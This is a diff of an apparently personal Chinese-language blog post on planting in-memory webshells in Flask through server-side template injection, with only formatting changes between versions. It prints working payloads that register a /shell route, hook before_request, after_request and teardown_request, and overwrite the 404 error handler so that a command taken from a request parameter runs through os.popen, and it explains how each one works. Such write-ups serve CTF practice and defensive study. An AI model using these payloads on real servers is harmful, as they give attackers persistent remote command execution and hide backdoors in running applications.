@@ -14,10 +14,10 @@
 <meta property="og:description" content="debug模式如果程序开启了debug模式，那么一般是要计算pin值，计算出pin值就很简单了。 非debug模式0x01 旧版内存马低版本的flask(ssti)一般可以直接使用以下payload： 1url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;&#x2F;shel">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-05-29T08:48:51.000Z">
-<meta property="article:modified_time" content="2025-05-29T08:57:52.128Z">
+<meta property="article:modified_time" content="2025-05-29T09:13:31.124Z">
 <meta property="article:author" content="Thr2on1">
-<meta property="article:tag" content="Flask">
 <meta property="article:tag" content="WEB">
+<meta property="article:tag" content="Flask">
 <meta name="twitter:card" content="summary">
     
     
@@ -116,7 +116,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#debug%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">debug模式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%9Edebug%E6%A8%A1%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">非debug模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%97%A7%E7%89%88%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.0.1.</span> <span class="toc-text">0x01 旧版内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%96%B0%E7%89%88%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.0.2.</span> <span class="toc-text">0x02 新版内存马</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#debug%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">debug模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9Edebug%E6%A8%A1%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">非debug模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%97%A7%E7%89%88%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 旧版内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%96%B0%E7%89%88%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 新版内存马</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -166,25 +166,30 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="debug模式"><a href="#debug模式" class="headerlink" title="debug模式"></a>debug模式</h1><p>如果程序开启了debug模式，那么一般是要计算pin值，计算出pin值就很简单了。</p>
-<h1 id="非debug模式"><a href="#非debug模式" class="headerlink" title="非debug模式"></a>非debug模式</h1><h3 id="0x01-旧版内存马"><a href="#0x01-旧版内存马" class="headerlink" title="0x01 旧版内存马"></a>0x01 旧版内存马</h3><p>低版本的flask(ssti)一般可以直接使用以下payload：</p>
+    <h2 id="debug模式"><a href="#debug模式" class="headerlink" title="debug模式"></a>debug模式</h2><p>如果程序开启了debug模式，那么一般是要计算pin值，计算出pin值就很简单了。</p>
+<h2 id="非debug模式"><a href="#非debug模式" class="headerlink" title="非debug模式"></a>非debug模式</h2><h3 id="0x01-旧版内存马"><a href="#0x01-旧版内存马" class="headerlink" title="0x01 旧版内存马"></a>0x01 旧版内存马</h3><p>低版本的flask(ssti)一般可以直接使用以下payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)</span><br></pre></td></tr></table></figure>
-<p><strong>原理</strong>:<br>第一行利用url_for函数作为入口点获取了当前命名空间的__builtins__模块，然后调用eval函数。<br>这个eval传入了两个参数，看第二个</p>
+<p><strong>原理</strong>:</p>
+<p>第一行利用url_for函数作为入口点获取了当前命名空间的__builtins__模块，然后调用eval函数。<br>这个eval传入了两个参数，看第二个</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],</span><br><span class="line">    &#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里需要介绍一下eval的第二个参数：<br>eval的第二个参数允许传入一个字典，一般是用来指定表达式执行的<strong>全局变量命名空间（globals）</strong><br>接下来再去理解第二个参数中传入的值就很好了。<br><code>_request_ctx_stack</code>是一个请求上下文栈。请求上下文是指在处理HTTP请求的过程中，Flask创建的一个临时环境，用来存储和管理与当前请求相关的信息<br><code>url_for.__globals__[&#39;current_app&#39;]</code>是当前运行的app。<br>然后看一下执行的代码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;app.add_url_rule(</span><br><span class="line">        &#x27;/shell&#x27;, </span><br><span class="line">        &#x27;shell&#x27;, </span><br><span class="line">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span><br></pre></td></tr></table></figure>
 <p>app.add_url_rule()是一个可以用来动态的添加路由的方法，我们可以通过这个方法动态的添加一个路由，其中我们可以通过匿名函数来处理这个路由的请求。<br>为了获取我们注入的命令，我们还需要当前HTTP请求的request对象，这也就是我们一开始要获取<code>_request_ctx_stack</code>的原因。在这个栈里，栈顶元素_request_ctx_stack.top自然就是我们当前请求的上下文，其中包含request对象，于是我们就可以获取当前请求GET传参的值，进而执行我们传入的命令。</p>
 <h3 id="0x02-新版内存马"><a href="#0x02-新版内存马" class="headerlink" title="0x02 新版内存马"></a>0x02 新版内存马</h3><p>比较新的flask版本，不允许我们在运行app的时候调用它的add_url_rule函数。<br>在阅读了大佬们写的文章后，我得知了可以使用flask自带的钩子函数，来达到注入内存马的目的。</p>
-<p><strong>before_request</strong><br>before_request()是Flask下的一个解释器，服务端在处理请求之前会调用before_request所设置的回调函数对请求进行预处理，比如说，身份验证、权限检查等。<br>我们可以通过调用app.before_request_funcs.setdefault()函数来为我们的before_request设置处理函数，在SSTI的过程中我们需要获取到eval函数或者exec函数都可以插入内存马。<br>payload:</p>
+<p><strong>before_request</strong></p>
+<p>before_request()是Flask下的一个解释器，服务端在处理请求之前会调用before_request所设置的回调函数对请求进行预处理，比如说，身份验证、权限检查等。<br>我们可以通过调用app.before_request_funcs.setdefault()函数来为我们的before_request设置处理函数，在SSTI的过程中我们需要获取到eval函数或者exec函数来插入内存马。<br>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())</span><br></pre></td></tr></table></figure>
 <p>跟旧版的一样，我们需要先获取上下文。<br>因此在eval执行命令的时候我们可以使用:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()),&#123;&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;</span><br></pre></td></tr></table></figure>
 <p>但是原内容会被before_request的返回内容覆盖，我们可以使用after_request解决这个问题。</p>
-<p><strong>after_request</strong><br>先看以下函数介绍：<br>![[Pasted image 20250417093253.png]]<br>这个解释器要求我们接收一个response对象，并且返回一个response对象。因此我们在定义匿名函数的时候需要设置一个参数(默认为respose类型)<br>payload:</p>
+<p><strong>after_request</strong></p>
+<p>先看以下函数介绍：<br>![[Pasted image 20250417093253.png]]<br>这个解释器要求我们接收一个response对象，并且返回一个response对象。因此我们在定义匿名函数的时候需要设置一个参数(默认为respose类型)<br>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(None,[]).append(lambda resp: make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()) if request.args.get(&#x27;cmd&#x27;) else resp)</span><br></pre></td></tr></table></figure>
 <p>SSTI中用法跟before_request一样。</p>
-<p><strong>teardown_request</strong><br>跟after_request用法一模一样，但是没有回显。</p>
-<p><strong>errorhandler</strong><br>errorhandler装饰器允许我们自定义报错界面<br>比如：</p>
+<p><strong>teardown_request</strong></p>
+<p>跟after_request用法一模一样，但是没有回显。</p>
+<p><strong>errorhandler</strong></p>
+<p>errorhandler装饰器允许我们自定义报错界面<br>比如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(404)</span><br><span class="line">def error():</span><br><span class="line">	return &quot;404!!!&quot;</span><br></pre></td></tr></table></figure>
 <p>通过errorhandler绑定一个钩子函数，然后HTTP状态码为404时就调用我们自定义的函数，那么我们就可以加以利用。<br>payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;)</span><br></pre></td></tr></table></figure>
@@ -220,7 +225,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#debug%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">debug模式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%9Edebug%E6%A8%A1%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">非debug模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%97%A7%E7%89%88%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.0.1.</span> <span class="toc-text">0x01 旧版内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%96%B0%E7%89%88%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.0.2.</span> <span class="toc-text">0x02 新版内存马</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#debug%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">debug模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9Edebug%E6%A8%A1%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">非debug模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%97%A7%E7%89%88%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 旧版内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%96%B0%E7%89%88%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 新版内存马</span></a></li></ol></li></ol>
       </div>
     
 
